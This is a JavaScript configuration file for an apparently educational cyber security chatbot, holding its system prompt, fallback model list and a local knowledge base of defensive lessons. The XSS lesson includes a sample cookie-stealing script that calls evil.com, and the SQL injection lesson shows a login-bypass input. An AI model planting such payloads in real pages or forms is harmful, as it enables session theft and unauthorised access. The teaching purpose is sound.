// Central configuration for the Cyber Security Chatbot.
// Keeping the prompt template, model name, and constants here (instead of
// scattering them through the controller/service) so the assistant's
// behaviour can be tuned in one place.

export const CHATBOT_MODEL = process.env.CHATBOT_MODEL || 'openrouter/free';

// Fallback models to try if primary fails (rate limit, no endpoints, etc.)
// These are all free-tier OpenRouter models known to be stable.
export const CHATBOT_FALLBACK_MODELS = (process.env.CHATBOT_FALLBACK_MODELS || '')
  .split(',')
  .map((m) => m.trim())
  .filter(Boolean)
  .length
  ? (process.env.CHATBOT_FALLBACK_MODELS || '').split(',').map((m) => m.trim()).filter(Boolean)
  : [
      'meta-llama/llama-3.2-3b-instruct:free',
      'meta-llama/llama-3.3-70b-instruct:free',
      'google/gemma-3-4b-it:free',
      'qwen/qwen3-coder:free',
      'openai/gpt-oss-20b:free',
    ];

export const CHATBOT_MAX_TOKENS = Number(process.env.CHATBOT_MAX_TOKENS) || 1400;
export const CHATBOT_MAX_HISTORY_MESSAGES = 12; // messages of context sent per request
export const CHATBOT_MAX_MESSAGE_LENGTH = 4000;

// Enable local knowledge base fallback when AI is unavailable
export const CHATBOT_ENABLE_LOCAL_FALLBACK = process.env.CHATBOT_ENABLE_LOCAL_FALLBACK !== 'off';

export const OFF_TOPIC_REPLY =
  "I'm specialized in Cyber Security and Digital Safety. Please ask anything related to cyber security, ethical hacking, networking, secure coding, privacy, cyber attacks, or digital protection.";

// System prompt: defines persona, scope, refusal behaviour, and answer
// structure. Kept as a single template string so it's easy to iterate on
// without touching any request-handling code.
export const CHATBOT_SYSTEM_PROMPT = `You are "Ask Me", the in-app Cyber Security learning assistant for the HackAware platform.

SCOPE
You ONLY answer questions related to cyber security and digital safety, including (but not limited to): ethical hacking, networking, malware/viruses/trojans/worms/ransomware, phishing/spear-phishing/whaling/smishing/vishing, social engineering, shoulder surfing, dumpster diving, piggybacking/tailgating, password security, authentication, MFA, firewalls, IDS/IPS, VPNs, encryption, cryptography, hashing, digital signatures, PKI, SSL/TLS, HTTPS, OS/Linux/Windows/cloud (AWS/Azure/GCP) security, Docker/Kubernetes security, DevSecOps, secure coding, the OWASP Top 10 (SQLi, XSS, CSRF, SSRF, command injection, LFI/RFI, buffer overflows), API security, JWT/OAuth/session management, incident response, digital forensics, SIEM/SOC, threat intelligence, zero trust, AI/LLM security (prompt injection, data poisoning, model security), cyber law and ethics, ISO 27001, NIST, CEH/Security+/CISSP concepts, penetration testing, vulnerability assessment, CTFs, bug bounty, current cyber threats/security news, and cyber security career guidance, certifications, and interview preparation.

If a question is unrelated to this scope (movies, politics, relationships, religion, medical advice, finance, general trivia, etc.), reply with EXACTLY this sentence and nothing else:
"I'm specialized in Cyber Security and Digital Safety. Please ask anything related to cyber security, ethical hacking, networking, secure coding, privacy, cyber attacks, or digital protection."

SAFETY BOUNDARIES
Never write or provide working malware, ransomware, keyloggers, exploits, backdoors, credential-stealing scripts, or step-by-step instructions to attack a real, specific target. Explain concepts, mechanisms, and detection/defense from an educational and defensive standpoint instead. You are a teacher and defender, not an attack tool.

RESPONSE STYLE
Detect the user's intent and adapt:
- Definition question ("What is X?") → clear definition + short explanation.
- "Difference between A and B" → a concise comparison (use a markdown table).
- "Teach me X" / "explain X" → structured lesson: Definition, How it works, Real-world example, Prevention & best practices, and (when relevant) common interview questions.
- "Explain like I'm a beginner" → simple language, everyday analogies, no jargon overload.
- "Interview questions on X" → a numbered list of realistic interview questions (add brief model answers only if asked).
- "Create a quiz / MCQs on X" → a short numbered quiz with options, and the answer key at the end.
- "Summarize" → a tight bullet summary of what was just discussed.
Keep answers well-formatted with markdown: headings, bullet lists, and fenced code blocks with a language tag for any commands/code/config. Be accurate, concise, and practical. Do not pad answers with sections that don't apply to the question.`;

// Quick suggested prompt chips shown in the UI.
export const SUGGESTED_PROMPTS = [
  'What is Phishing?',
  'Explain SQL Injection',
  'OWASP Top 10',
  'Difference between IDS & IPS',
  'Password Security Tips',
  'Latest Cyber Threats',
  'Linux Security Basics',
  'Cloud Security',
  'Zero Trust Architecture',
  'Cyber Security Career Roadmap',
];

// Local knowledge base for offline fallback when OpenRouter is unavailable.
// Covers the most common prompts so chatbot never shows "User not found" or 502.
export const LOCAL_KNOWLEDGE_BASE = [
  {
    keywords: ['phishing', 'what is phishing'],
    response: `## What is Phishing?

Phishing is a **social engineering attack** where attackers impersonate trusted entities to steal sensitive data.

### How it works
1. **Bait**: Fake email/SMS that looks legitimate (bank, company, friend)
2. **Hook**: Urgent language + malicious link or attachment
3. **Capture**: Fake login page steals credentials

### Types
- **Spear Phishing**: Targeted at specific individuals
- **Whaling**: Targets executives
- **Smishing**: SMS-based phishing
- **Vishing**: Voice call phishing

### Prevention
- Hover over links before clicking
- Verify sender domain carefully
- Enable MFA everywhere
- Use email authentication (SPF, DKIM, DMARC)
- Report suspicious messages

> 💡 **Interview Tip**: Explain how you'd detect phishing via email headers and URL analysis.`,
  },
  {
    keywords: ['sql injection', 'sqli', 'sql-injection'],
    response: `## SQL Injection (SQLi)

SQL Injection is an attack where malicious SQL is inserted into input fields to manipulate databases.

### How it works
\`\`\`sql
-- Vulnerable code
SELECT * FROM users WHERE email = '$email' AND password = '$password'

-- Attacker input: ' OR '1'='1
SELECT * FROM users WHERE email = '' OR '1'='1' AND password = ''
\`\`\`

### Types
- **In-band**: Error-based, Union-based
- **Blind**: Boolean-based, Time-based
- **Out-of-band**: Uses DNS/HTTP to exfiltrate

### Prevention
- **Parameterized queries / Prepared statements** (most important)
- Input validation + allowlists
- Least privilege DB accounts
- WAF rules
- Don't expose detailed DB errors

### Secure Example (Node.js)
\`\`\`javascript
// Safe
const [users] = await db.query('SELECT * FROM users WHERE email = ?', [email]);
\`\`\``,
  },
  {
    keywords: ['xss', 'cross site scripting', 'cross-site scripting'],
    response: `## Cross-Site Scripting (XSS)

XSS injects malicious scripts into web pages viewed by others.

### Types
| Type | How it works |
|------|--------------|
| **Stored** | Script saved in DB, served to all users |
| **Reflected** | Script in URL, reflected immediately |
| **DOM-based** | Client-side JS vulnerability |

### Example
\`\`\`html
<!-- Vulnerable -->
<div>{{ userComment }}</div>

<!-- Attacker comment -->
<script>fetch('https://evil.com?cookie='+document.cookie)</script>
\`\`\`

### Prevention
- Render user content as **plain text**, not HTML
- Use frameworks that auto-escape (React does this by default)
- Content Security Policy (CSP)
- Sanitize HTML with allowlist library (DOMPurify)
- HttpOnly cookies`,
  },
  {
    keywords: ['owasp top 10', 'owasp'],
    response: `## OWASP Top 10 (2021)

1. **A01: Broken Access Control** - Users can act outside permissions
2. **A02: Cryptographic Failures** - Sensitive data exposed
3. **A03: Injection** - SQLi, XSS, Command injection
4. **A04: Insecure Design** - Missing security controls from start
5. **A05: Security Misconfiguration** - Default configs, verbose errors
6. **A06: Vulnerable Components** - Outdated libraries
7. **A07: Auth Failures** - Weak session management
8. **A08: Data Integrity Failures** - Insecure deserialization
9. **A09: Logging Failures** - Insufficient monitoring
10. **A10: SSRF** - Server fetches attacker-controlled URL

> Learn one at a time in HackAware labs: SQLi, XSS, CSRF, Clickjacking etc.`,
  },
  {
    keywords: ['ids', 'ips', 'difference between ids & ips', 'ids ips'],
    response: `## IDS vs IPS

| Feature | IDS (Intrusion Detection) | IPS (Intrusion Prevention) |
|---------|---------------------------|----------------------------|
| **Action** | Detects & alerts only | Detects & **blocks** |
| **Placement** | Out-of-band (mirror port) | In-line (traffic flows through it) |
| **Risk** | No latency, but no blocking | Can block legit traffic if misconfigured |
| **Use case** | Monitoring, forensics | Active defense |

### Types
- **NIDS/HIDS**: Network vs Host based
- **Signature vs Anomaly**: Known patterns vs behavioral

**Best practice**: Use both - IDS for visibility, IPS for critical segments, tuned to avoid false positives.`,
  },
  {
    keywords: ['password', 'password security'],
    response: `## Password Security Tips

### Strong Passwords
- **Length > 12**, mix of upper, lower, numbers, symbols OR use **passphrases**: \`correct-horse-battery-staple\`
- Unique per site - never reuse
- Use a **password manager** (Bitwarden, 1Password)

### Storage (for developers)
- Never store plain text
- Use **bcrypt / Argon2** with salt
\`\`\`javascript
const hash = await bcrypt.hash(password, 12);
\`\`\`

### Defense
- **MFA**: TOTP or security keys (not SMS if possible)
- Rate limit login attempts
- Check against breached passwords (HaveIBeenPwned API)
- Secure reset flows`,
  },
  {
    keywords: ['zero trust', 'zero trust architecture'],
    response: `## Zero Trust Architecture

**Principle**: "Never trust, always verify" - no implicit trust based on network location.

### Core Pillars
1. **Identity**: Verify user + device every time (MFA, device health)
2. **Device**: Ensure endpoint compliance
3. **Network**: Micro-segmentation, least privilege access
4. **Application**: Secure by design, continuous auth
5. **Data**: Classify, encrypt, monitor

### Implementation
- **ZTNA** replaces VPN - app-level access, not network-level
- **Least privilege**: Just-enough, just-in-time access
- **Continuous monitoring**: SIEM + UEBA

> Interview: Explain how Zero Trust differs from castle-and-moat model.`,
  },
  {
    keywords: ['cloud security', 'aws', 'azure'],
    response: `## Cloud Security Basics

### Shared Responsibility
- **Provider**: Physical security, hypervisor
- **You**: Data, IAM, configs, app security

### Top Misconfigurations
- Public S3 buckets / storage
- Overly permissive IAM ( \`*:*\` )
- No MFA on root account
- Unencrypted data at rest
- No logging (CloudTrail disabled)

### Best Practices
- **IAM**: Least privilege, roles not users, MFA
- **Network**: Private subnets, Security Groups, WAF
- **Data**: Encryption with KMS, versioning + backup
- **Monitoring**: CloudTrail, GuardDuty, Security Hub
- **IaC**: Scan Terraform/CloudFormation with Checkov`,
  },
  {
    keywords: ['linux security', 'linux'],
    response: `## Linux Security Basics

### Hardening
- Keep kernel & packages updated
- Disable root SSH, use keys: \`PasswordAuthentication no\`
- Firewall: \`ufw\` or \`iptables\`
- Least privilege: \`sudo\` + audit

### File Security
\`\`\`bash
# Permissions
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Find SUID binaries (potential privesc)
find / -perm -4000 2>/dev/null
\`\`\`

### Monitoring
- \`auditd\` for syscall auditing
- \`fail2ban\` for brute-force
- \`lynis\` for auditing
- Check logs: \`/var/log/auth.log\`, \`journalctl\``,
  },
  {
    keywords: ['career', 'roadmap', 'cyber security career'],
    response: `## Cyber Security Career Roadmap

### Phase 1: Foundations (0-6 months)
- Networking: TCP/IP, DNS, HTTP, VPN
- Linux + Windows basics
- Python/Bash scripting

### Phase 2: Core Security (6-12 months)
- OWASP Top 10, Burp Suite
- TryHackMe / HackTheBox
- CompTIA Security+

### Phase 3: Specialize
- **Pentesting**: OSCP, eJPT
- **Blue Team**: SOC, SIEM (Splunk), Incident Response
- **Cloud**: AWS Security Specialty, CCSP
- **AppSec**: Secure coding, DevSecOps

### Phase 4: Real Experience
- Bug bounty (HackerOne)
- CTFs
- Build labs (like HackAware!)
- Document learnings on blog/GitHub

> Start with HackAware labs, then TryHackMe "Pre-Security" path.`,
  },
  {
    keywords: ['latest cyber threats', 'threats', 'latest threats'],
    response: `## Latest Cyber Threats (General Landscape)

### Trending (2025-2026)
- **AI-powered phishing**: LLM-generated spear phishing, deepfake voices
- **Ransomware 2.0**: Double extortion (encrypt + leak)
- **Supply chain**: Attacks via dependencies (npm, PyPI)
- **Cloud misconfig**: Exposed buckets, leaked keys in GitHub
- **API abuse**: Broken auth on APIs (OWASP API Top 10)

### Stay Updated
- Check HackAware **Cyber News** tab (real-time feeds from The Hacker News, BleepingComputer, CISA)
- Follow CISA KEV catalog for exploited vulnerabilities
- Subscribe to vendor security advisories

> Open /dashboard?tab=news for live curated news.`,
  },
];
